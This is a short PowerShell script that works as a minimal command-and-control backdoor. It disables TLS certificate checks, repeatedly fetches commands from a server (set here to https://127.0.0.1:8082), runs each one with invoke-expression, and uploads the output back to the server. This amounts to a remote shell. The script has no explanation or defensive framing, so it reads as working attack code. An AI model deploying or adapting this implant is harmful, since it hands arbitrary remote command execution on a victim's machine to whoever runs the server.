$server = "https://127.0.0.1:8082"
$wc = New-Object Net.WebClient
while($true)
{
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$result = $wc.DownloadString("$server/fetch")
while($result) {
	$output = invoke-expression $result | out-string 
	$wc.UploadString("$server/response", $output)	
	break
}
}
